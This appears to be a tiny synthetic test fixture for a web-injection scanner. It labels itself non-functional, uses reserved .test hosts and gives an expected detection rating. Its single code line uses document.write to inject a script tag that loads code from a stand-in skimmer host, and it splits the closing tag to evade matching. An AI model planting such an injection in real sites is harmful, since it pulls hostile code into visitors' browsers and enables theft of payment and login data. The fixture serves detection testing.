// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: inject.script=medium
document.write('<script src="https://evil.skim.test/x.js"></scr' + 'ipt>');
